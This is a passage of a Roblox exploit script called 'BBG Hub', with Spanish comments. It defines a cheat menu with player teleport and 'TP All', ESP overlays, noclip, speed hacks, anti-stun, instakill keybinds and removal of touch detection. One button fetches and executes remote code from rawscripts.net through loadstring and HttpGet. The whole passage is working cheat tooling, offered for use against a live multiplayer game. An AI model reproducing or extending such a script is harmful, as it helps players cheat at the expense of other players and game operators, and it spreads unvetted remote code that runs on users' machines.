SpectateConnection = RunService.RenderStepped:Connect(function()
if SelectedPlayer then
local target = Players:FindFirstChild(SelectedPlayer)
if target and target.Character then
workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
end
end
end)
else
if SpectateConnection then 


SpectateConnection:Disconnect() end
workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
end
end,
})
  
-- ðŸŸ£ TAB PLAYER LOCK
Tab3:CreateSlider({
Name = "ðŸ“ŸPredictionðŸ“Ÿ",
Range = {0, 10},
Increment = 0.1,
CurrentValue = 0,
Callback = function(v) PredictionStrength = v end
})
Tab3:CreateToggle({
Name = "ðŸ‘¥Tween To PlayerðŸ‘¥",
CurrentValue = false,
Flag = "TPToggle",
Callback = function(v)


TeleportEnabled = v
if v then
if SelectedPlayer then StartTeleporting() end
else
if TeleportConnection then TeleportConnection:Disconnect() end
if ActiveTween then ActiveTween:Cancel() ActiveTween = nil end
SetNoCollide(false)
end
end,
})
  
Tab3:CreateButton({
Name = "ðŸŒTP AllðŸŒ",
Callback = function()
task.spawn(function()
for _, p in pairs(Players:GetPlayers()) do
if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") 


then
local startTime = tick()
while tick() - startTime < 5 do
if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
pcall(function() LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(0, YOffset, 0) end)
else break end
task.wait()
end
end
end
Rayfield:Notify({Title = "TP All", Content = "Finalizado.", Duration = 5})
end)
end
})


Tab3:CreateButton({Name = "ðŸ”„Refrescar ListaðŸ”„", Callback = function() PlayerDropdown:Refresh(GetPlayerList(), true) end})
  
Tab3:CreateSlider({
Name = "ðŸŒŠY OffsetðŸŒŠ",
Range = {0, 10000}, Increment = 1, CurrentValue = 0,
Callback = function(Value) YOffset = Value end,
})
  
Tab3:CreateToggle({
Name = "ðŸ§­Auto V4ðŸ§­",
CurrentValue = false,
Callback = function(v)
autoV4 = v
task.spawn(function()
while autoV4 do


task.wait(0.5)
pcall(function() LocalPlayer.Backpack.Awakening.RemoteFunction:InvokeServer(true) end)
end
end)
end,
})
  
-- ðŸŒ TAB TPs (ORIGINAL)
Tab4:CreateButton({
Name = "âš“Tp Barcoâš“",
Callback = function()
if LocalPlayer.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6500, 129, -123) end
end
})
Tab4:CreateToggle({
Name = "ðŸ§ŸHauntled V4 Healthâš“",


CurrentValue = false,
Flag = "ShipHealToggle",
Callback = function(Value)
local hrp = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if hrp then
if Value then
-- Guardar posiciÃ³n actual
_G.ReturnCombatPos = hrp.CFrame
-- TP adelantado (mÃ¡s adentro del barco)
hrp.CFrame = CFrame.new(938.212, 125.103, 32852.832)
Rayfield:Notify({Title = "BBG Hub", Content = "Curando en zona segura...", Duration = 2})
else
-- Regresar a la posiciÃ³n de combate
if _G.ReturnCombatPos then
hrp.CFrame = _G.ReturnCombatPos
end


Rayfield:Notify({Title = "BBG Hub", Content = "Regresando al combate", Duration = 2})
end
end
end,
})
  
Tab5:CreateSection("--- Pasivas ---")
Tab5:CreateToggle({
Name = "ðŸ‡WalkSpeedðŸ‡",
CurrentValue = false,
Callback = function(v) _G.WalkSpeedEnabled = v end
})
  
Tab5:CreateSlider({
Name = "âš¡MOD WalkSpeedâš¡",
Range = {16, 500},
Increment = 1,
CurrentValue = 40,


Callback = function(Value) _G.WalkSpeedValue = Value end,
})
  
Tab5:CreateToggle({
Name = "ðŸ§±NoclipðŸ§±",
CurrentValue = false,
Flag = "NoclipStatus",
Callback = function(Value)
SetNoclip(Value)
end,
})
  
local ExternalFlyButton = Tab5:CreateButton({
Name = "ðŸª½FlyðŸª½",
Callback = function()
-- EjecuciÃ³n del loadstring
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-v3-64434"))()
end,


})
  
Tab5:CreateSection("--- Protecciones ---")
Tab5:CreateToggle({
Name="ðŸ”¥Anti Stunâ„ï¸",
CurrentValue=false,
Callback=function(v)
if v then
local function addAntiStun(char)
if not char:FindFirstChild("AntiMover") then Instance.new("Folder", char).Name = "AntiMover" end
end
if LocalPlayer.Character then addAntiStun(LocalPlayer.Character) end
_G.AntiStunConnection = LocalPlayer.CharacterAdded:Connect(addAntiStun)
else
if _G.AntiStunConnection then 


_G.AntiStunConnection:Disconnect() end
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("AntiMover") then LocalPlayer.Character.AntiMover:Destroy() end
end
end,
})
  
Tab5:CreateSection("--- Funciones ---")
Tab5:CreateToggle({
Name="ðŸŒ€UnbreakableðŸŒ€",
CurrentValue=false,
Callback=function(v)
_G.Unbreakable = v
task.spawn(function()
while _G.Unbreakable do
task.wait(0.1)
if LocalPlayer.Character then LocalPlayer.Character:SetAttribute("Unbreakable


All", true) end
end
end)
end,
})
  
Tab5:CreateButton({
Name = "ðŸ”¥Remove TouchInterestðŸ’§",
Callback = function()
for _, descendant in pairs(game:GetDescendants()) do
if descendant:IsA("TouchTransmitter") then descendant:Destroy() end
end
end
})
  
-- ðŸ‘ï¸ TAB ESP (ORIGINAL + MAX DISTANCE)
TabESP:CreateToggle({Name = "ðŸ‘ï¸Enable ESPðŸ‘ï¸", CurrentValue = true, Callback = 


function(v) _G.ESPEnabled = v end})
TabESP:CreateToggle({Name = "ðŸ‘ï¸BoxesðŸ‘ï¸", CurrentValue = true, Callback = function(v) _G.ESPBoxes = v end})
TabESP:CreateToggle({Name = "ðŸ‘ï¸NamesðŸ‘ï¸", CurrentValue = true, Callback = function(v) _G.ESPNames = v end})
TabESP:CreateSlider({
Name = "ðŸ‘ï¸Max DistanceðŸ‘ï¸",
Range = {100, 99999999},
Increment = 100,
CurrentValue = 99999999,
Callback = function(v) ESPMaxDistance = v end
})
  
TabESP:CreateToggle({
Name = "ðŸ‘ï¸ESP AimðŸŒ",
CurrentValue = false,
Flag = "ESP_Box_Toggle",
Callback = function(Value)


ESP_Enabled = Value
end,
})
  
-- [5] INPUT SYSTEM UNIFICADO
UserInputService.InputBegan:Connect(function(input, gp)
if gp then return end
  
-- Teclas G / N: Instakill
if input.KeyCode == Enum.KeyCode.G or input.KeyCode == Enum.KeyCode.N then
InstakillActive = not InstakillActive
InstakillToggle:Set(InstakillActive)
end
  
-- Tecla B: Vuelo / UpLoop
if input.KeyCode == Enum.KeyCode.B then
local hrp = LocalPlayer.Character:FindFirstChild("Humanoid


RootPart")
if hrp then
local flag = hrp:FindFirstChild("UpLoop")
if flag then flag:Destroy() else
flag = Instance.new("BoolValue", hrp); flag.Name = "UpLoop"
task.spawn(function()
while flag.Parent do
hrp.CFrame = hrp.CFrame * CFrame.new(0, 273861, 0)
task.wait(0.01)
end
end)
end
end
end
end)
-- Sistema de detecciÃ³n de nuevos jugadores
game.Players.PlayerAdded:Connect(function(p)
Rayfield:Notify({


Title = "Alguien a entrado",
Content = p.Name .. " ha entrado al servidor.",
Duration = 3,
})
CreateESP(p)
end)
  
Rayfield:Notify({Title = "BBG Hub", Content = "Bienvenido a BBG Hubâ™¾ï¸.", Duration = 5})